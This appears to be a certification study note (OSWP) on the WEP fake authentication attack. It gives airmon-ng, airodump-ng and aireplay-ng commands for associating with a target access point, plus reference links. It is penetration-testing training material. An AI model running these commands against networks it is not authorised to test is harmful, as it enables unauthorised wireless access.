# OSWP - Fake Authentication Attack (WEP)

The fake authentication attack allows you to perform the two types of WEP authentication (Open System and Shared Key) plus associate with the access point (AP). This is only useful when you need an associated MAC address in various aireplay-ng attacks and there is currently no associated client. It should be noted that the fake authentication attack does NOT generate any ARP packets. Fake authentication cannot be used to authenticate/associate with WPA/WPA2 Access Points.

## Commands

* Run [setup](../../setup.md) first
* Two terminals needed here, so use `screen` or log in twice
     * Make sure terminal is full screen
* Make sure that there are no associated clients connected to target AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $DEVICE $CHANNEL

# Start monitoring
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the fake authentication attack
sudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE
```

## References

* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Fake Authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication)
* [REdBlueTeam](https://youtu.be/_9qJ1Urpn0Y?t=1860)